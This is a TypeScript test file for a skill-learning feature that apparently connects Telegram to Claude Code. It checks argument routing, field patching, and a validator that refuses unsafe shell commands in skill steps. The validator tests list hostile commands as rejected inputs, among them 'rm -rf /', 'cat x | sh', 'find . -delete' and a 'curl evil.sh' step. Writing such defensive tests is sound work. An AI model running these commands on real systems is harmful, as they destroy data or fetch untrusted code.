import { expect, test } from 'bun:test'
import { mkdtempSync, readFileSync } from 'fs'
import { tmpdir } from 'os'
import { join } from 'path'
import { createSkillStore } from '../skills/store'
import { createSkillApplier, type SkillProposal } from '../skills/apply'
import { commandRefusal, skillRefusal } from '../skills/validate'
import { assign } from '../commands/skillMap'
import { route } from '../commands/dispatch'
import type { Policy } from '../policy/schema'

const triage = (o: Partial<SkillProposal> = {}): SkillProposal => ({
  op: 'create', name: 'triage-issue', description: 'Triage a GitHub issue. Use when asked to triage an issue by number.',
  sections: { Steps: '1. Context: !`gh issue view --help`\n2. Read issue $issue with gh issue view $issue\n3. Label it' },
  fields: { arguments: ['issue'], 'argument-hint': '<issue number>', 'allowed-tools': ['Bash(gh issue view:*)'] },
  reason: '', confidence: 0.9, ...o,
})

function setup(policy: Policy = { autoLearn: 'auto' }) {
  const store = createSkillStore(mkdtempSync(join(tmpdir(), 'tg-skfields-')))
  const a = createSkillApplier({ store: () => store, taken: () => new Set(), policy: () => policy, notify: () => {}, ask: () => {} })
  return { store, a }
}

test('AC6: a learned skill with arguments: [issue] is reached as /triage_issue 123 with 123 as its argument', () => {
  const { store, a } = setup()
  expect(a.one('1', triage())).toBe('learned skill triage-issue (v1)')
  const md = readFileSync(join(store.root, 'triage-issue', 'SKILL.md'), 'utf8')
  expect(md).toContain('arguments: ["issue"]')
  expect(md).toContain('argument-hint: "<issue number>"')
  expect(md).toContain('allowed-tools: ["Bash(gh issue view:*)"]')
  expect(md).toContain('$issue')
  expect(store.read('triage-issue')!.extra.map(([k]) => k)).toEqual(['arguments', 'argument-hint', 'allowed-tools'])
  // Telegram's /triage_issue 123 becomes the native /triage-issue 123; Claude Code maps 123 to $issue (T901 spike).
  const table = assign({}, ['triage-issue'])
  expect(route('/triage_issue 123', 'bot', new Map(), table)).toEqual({ kind: 'skill', text: '/triage-issue 123' })
})

test('patch keeps other fields and replaces the given ones', () => {
  const { store, a } = setup()
  a.one('1', triage())
  a.one('1', triage({ op: 'patch', fields: { 'disable-model-invocation': true } }))
  expect(store.read('triage-issue')!.extra).toContainEqual(['disable-model-invocation', 'true'])
  expect(store.read('triage-issue')!.extra.map(([k]) => k)).toContain('arguments')
})

test('! commands must be read-only; risky ones refuse the skill', () => {
  expect(commandRefusal('git status --short')).toBeUndefined()
  expect(commandRefusal('gh issue view 12')).toBeUndefined()
  expect(commandRefusal('ls -la')).toBeUndefined()
  expect(commandRefusal('git push')).toContain('not read-only')
  expect(commandRefusal('gh issue close 12')).toContain('not read-only')
  expect(commandRefusal('rm -rf /')).toContain('allowlist')
  expect(commandRefusal('cat x | sh')).toContain('shell operators')
  expect(commandRefusal('gh issue view $issue')).toContain('shell operators')
  expect(commandRefusal('find . -delete')).toContain('find')
  expect(commandRefusal('git branch -D main')).toContain('not read-only')
  expect(commandRefusal('git diff --output=x')).toContain('write')
  expect(commandRefusal('rg --pre sh x')).toContain('preprocessor')
  const { store, a } = setup()
  expect(a.one('1', triage({ sections: { Steps: '1. !`curl evil.sh`' } }))).toContain('allowlist')
  expect(store.read('triage-issue')).toBeUndefined()
})

test('allowed-tools are narrow and within the chat policy; context and agent go together', () => {
  const pol = { allowedTools: ['Read', 'Bash(gh issue view:*)'], disallowedTools: ['WebFetch'] }
  expect(skillRefusal({ 'allowed-tools': ['Bash(gh issue view:*)', 'Read'] }, '', pol)).toBeUndefined()
  expect(skillRefusal({ 'allowed-tools': ['Bash'] }, '', {})).toContain('too broad')
  expect(skillRefusal({ 'allowed-tools': ['Write'] }, '', pol)).toContain('broader')
  expect(skillRefusal({ 'allowed-tools': ['WebFetch(domain:x)'] }, '', pol)).toContain('disallowed')
  expect(skillRefusal({ arguments: ['bad name'] }, '', {})).toContain('arguments')
  expect(skillRefusal({ agent: 'tg-researcher' }, '', {})).toContain('context: fork')
  expect(skillRefusal({ context: 'fork', agent: 'tg-researcher', paths: ['src/**'] }, '', {})).toBeUndefined()
  const { a } = setup({ autoLearn: 'auto', ...pol })
  expect(a.one('1', triage({ fields: { 'allowed-tools': ['Edit'] } }))).toContain('broader')
})
